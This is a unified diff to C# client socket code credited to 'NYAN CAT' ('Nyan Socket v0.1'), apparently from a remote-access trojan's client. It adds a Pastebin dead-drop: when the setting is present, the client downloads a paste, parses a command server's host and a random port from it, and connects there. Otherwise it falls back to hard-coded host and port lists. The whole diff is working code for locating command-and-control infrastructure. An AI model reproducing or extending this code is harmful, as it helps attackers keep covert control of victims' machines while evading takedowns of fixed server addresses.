@@ -12,6 +12,7 @@ using System.Security.Principal;
 using System.Net.Security;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
+using System.Net;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
@@ -43,8 +44,24 @@ namespace Client.Sockets
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
-                Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
-                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
+                if (Settings.Pastebin == "null")
+                {
+                    Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
+    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
+                }
+                else
+                {
+                    using (WebClient wc = new WebClient())
+                    {
+                        NetworkCredential networkCredential = new NetworkCredential("", "");
+                        wc.Credentials = networkCredential;
+                        string resp = wc.DownloadString(Settings.Pastebin);
+                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
+                        Settings.Hosts = spl[0];
+                        Settings.Ports = spl[new Random().Next(1,spl.Length)];
+                        Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
+                    }
+                }
                 if (Client.Connected)
                 {
                     Debug.WriteLine("Connected!");
